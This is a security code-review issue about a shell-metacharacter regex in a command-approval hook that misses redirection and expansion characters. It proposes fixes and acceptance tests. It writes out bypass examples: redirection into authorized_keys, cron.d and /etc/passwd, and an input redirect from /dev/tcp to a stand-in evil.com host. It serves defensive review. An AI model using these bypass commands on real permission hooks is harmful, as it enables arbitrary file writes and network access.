---
status: complete
priority: p1
issue_id: "002"
tags: [code-review, security]
dependencies: []
---

# Shell Metacharacter Regex Missing Critical Characters (>, <)

## Problem Statement

The `has_shell_meta` function in `dyad-hook.sh` line 124 is intended to reject commands containing shell injection characters for allow rules. It is missing several dangerous characters, most critically `>` and `<` (output/input redirection).

This means a command like `git log > ~/.ssh/authorized_keys` would pass the shell metacharacter check and be auto-approved by the `git *` allow rule, achieving arbitrary file write.

## Findings

- `dyad-hook.sh:124` — `def has_shell_meta: test("[;|&$\x60()\\n]");`
- Missing `>` — allows output redirection: `git status > /etc/cron.d/evil`
- Missing `<` — allows input redirection
- Missing `{}` — allows brace expansion
- Missing `#` — allows comment injection
- Missing `~` — tilde expansion
- Missing `!` — history expansion
- Missing `\r` — only `\n` is caught
- The check only applies to allow rules (correct behavior — deny rules should match broadly)
- Test suite tests command chaining (`&&`, `;`, `|`, `$`) but does not test redirection (`>`, `<`)

## Proposed Solutions

### Option 1: Expand the character blacklist (quick fix)

**Approach:** Add missing characters to the regex: `[;|&$\x60()\n\r><{}!#~\\]`

**Pros:**
- Minimal code change (1 line)
- Immediately blocks redirection attacks

**Cons:**
- Blacklist approach is inherently incomplete — new bypass vectors may emerge
- May over-block legitimate commands (e.g., `npm install > install.log`)

**Effort:** 30 minutes

**Risk:** Low

---

### Option 2: Whitelist approach (more robust)

**Approach:** Instead of checking for bad characters, only allow commands matching `[a-zA-Z0-9 _./-]` (safe character set). Any character outside this set fails the check.

**Pros:**
- Future-proof against new shell metacharacters
- Simpler mental model

**Cons:**
- May be too restrictive for legitimate commands with special characters
- Would need exceptions for common patterns (e.g., `--flag=value`)

**Effort:** 1-2 hours

**Risk:** Medium (may break legitimate use cases)

---

### Option 3: Blacklist + add redirection-specific tests

**Approach:** Option 1 plus comprehensive test coverage for each bypass vector.

**Pros:**
- Quick fix + test safety net
- Documents the threat model

**Cons:**
- Still a blacklist

**Effort:** 1 hour

**Risk:** Low

## Recommended Action

## Technical Details

**Affected files:**
- `dyad-hook.sh:124` — `has_shell_meta` jq function
- `test-dyad.sh` — needs new test cases for `>`, `<`, `{}` bypass attempts

## Acceptance Criteria

- [ ] `git log > /etc/passwd` is denied (not allowed by `git *` rule)
- [ ] `npm test < /dev/tcp/evil.com/1234` is denied
- [ ] `git {status,log}` is denied
- [ ] `git status` (no metacharacters) is still allowed
- [ ] Tests cover all newly blocked characters
- [ ] Existing tests continue to pass

## Work Log

### 2026-03-13 - Initial Discovery

**By:** Code Review (Security Sentinel + Architecture Strategist + Performance Oracle)

**Actions:**
- Identified missing `>` and `<` characters in shell metacharacter regex
- Verified that redirection-based bypass is exploitable with current default rules
- Identified additional missing characters

## Resources

- **Repo:** https://github.com/ndp32/dyad
